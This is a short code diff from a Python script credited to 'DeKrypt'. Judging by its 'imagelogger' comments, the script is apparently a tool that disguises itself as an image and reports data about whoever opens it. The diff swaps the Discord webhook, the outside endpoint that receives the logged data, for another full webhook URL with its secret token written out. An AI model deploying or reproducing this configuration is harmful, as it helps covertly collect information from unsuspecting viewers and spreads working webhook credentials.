@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1341859694515454022/N8ncx0f4JhzPvaFTFzFDw9ygt2SEoo9Hp7QlmtNLKaloQNE0uOKCcmHK2QToirgo4-A5",
+    "webhook": "https://discord.com/api/webhooks/1341879096074047579/YYK0GLSte-hAEJOcwgnnuH_KFDBiH7NwdVlPT3nwG95FGkp8vwydw322HdcHw6LMRVC8",
     "image": "https://images.nrc.nl/wo6i1IGemSy9WfvMRKxm0w0C02E=/1280x/filters:no_upscale()/s3/static.nrc.nl/tech/files/2014/04/HD-Windows-XP-Bliss-Wallpaper-Backgrounds.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
